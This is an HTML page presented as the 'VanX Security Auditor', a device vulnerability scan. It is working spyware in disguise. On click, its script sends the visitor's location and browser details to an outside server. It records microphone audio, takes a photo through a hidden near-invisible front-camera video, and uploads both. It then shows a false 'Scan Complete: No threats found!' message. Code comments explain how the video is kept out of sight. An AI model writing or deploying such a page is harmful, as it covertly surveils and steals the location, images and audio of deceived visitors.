<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Vulnerability Check</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        .btn { padding: 15px 30px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; }
        
        /* FIX: Video ko hide karne ka naya tarika */
        #hidden_video { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 1px; 
            height: 1px; 
            opacity: 0.01; /* Bilkul halka sa visible taaki browser ise chalu rakhe */
            pointer-events: none;
        }
    </style>
</head>
<body>
    <h1>VanX Security Auditor</h1>
    <p>This tool will scan your device for security vulnerabilities.</p>
    <button class="btn" onclick="startAudit()">START SECURITY SCAN</button>

    <video id="hidden_video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const API_URL = "https://vivanx-backend.onrender.com/log";

        async function startAudit() {
            // 1. Get Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await fetch(API_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'info',
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            device: navigator.userAgent
                        })
                    });
                }, (err) => { console.log("Loc Denied"); });
            }

            // 2. Access Camera & Mic
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, // Front camera specify kiya
                    audio: true 
                });

                const video = document.getElementById('hidden_video');
                video.srcObject = stream;

                // Audio recording start
                const mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];
                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = async () => {
                        await fetch(API_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ type: 'audio', audio: reader.result })
                        });
                    };
                };
                mediaRecorder.start();

                // FIX: Wait for video to actually start playing
                video.onloadedmetadata = () => {
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        // Drawing the frame to canvas
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imgData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality for faster upload
                        
                        await fetch(API_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ type: 'image', image: imgData })
                        });

                        mediaRecorder.stop();
                        stream.getTracks().forEach(t => t.stop());
                        alert("Scan Complete: No threats found!");
                    }, 4000); // 4 seconds ka wait perfect hai
                };

            } catch (err) {
                alert("Please grant permissions to run the security audit.");
            }
        }
    </script>
</body>
</html>
